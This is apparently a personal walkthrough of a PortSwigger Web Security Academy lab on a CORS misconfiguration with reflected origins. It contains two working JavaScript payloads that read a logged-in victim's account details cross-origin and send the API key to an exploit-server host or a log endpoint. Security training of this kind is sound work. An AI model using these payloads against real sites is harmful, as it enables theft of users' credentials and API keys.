# [CORS] Lab: CORS vulnerability with basic origin reflection (1)

---

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20re%2017f3b33a907c4ec49253a7b97cb7e024/Untitled.png)

because the website trusts all origins this means that any request originating from an external domain will be allowed, and these requests will be able to retrieve the user's session tokens and API tokens. 

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20re%2017f3b33a907c4ec49253a7b97cb7e024/Untitled%201.png)

this was the request and responses 

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20re%2017f3b33a907c4ec49253a7b97cb7e024/Untitled%202.png)

I passed the request for `/my-account`  into repeater to test to see if the application would still be able to pass my API Key.

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20re%2017f3b33a907c4ec49253a7b97cb7e024/Untitled%203.png)

```jsx
<script>
  
fetch('https://0a3100c7031da26580c5a339007300a0.web-security-academy.net/accountDetails', {
  mode: 'cors', // Ensure CORS policy is respected
  credentials: 'include' // Send credentials with the request
})
  .then(response => {
    return response.json();
    })
    .then(data => {
      const apiKey = data.apikey; // Assign the correct property name
      const url = `https://exploit-0ada002b037ba2be80fba2d001a8004b.exploit-server.net/?apiKey=${apiKey}`;
      // Ensure the second fetch also respects CORS and includes credentials
      return fetch(url);
    });
  
</script>
```

this worked: 

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20re%2017f3b33a907c4ec49253a7b97cb7e024/Untitled%204.png)

but didn't solve the lab when delivering the exploit to the victim. 

attempt 2: 

```jsx
  var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ad300cc03a661c88115525f003f00d0.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
```

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20re%2017f3b33a907c4ec49253a7b97cb7e024/1a38bfa7-ed95-496b-a3b9-df67b096220a.png)

as you can see I had issue with the portswigger lab but both payloads worked. 

![Untitled](%5BCORS%5D%20Lab%20CORS%20vulnerability%20with%20basic%20origin%20re%2017f3b33a907c4ec49253a7b97cb7e024/Untitled%205.png)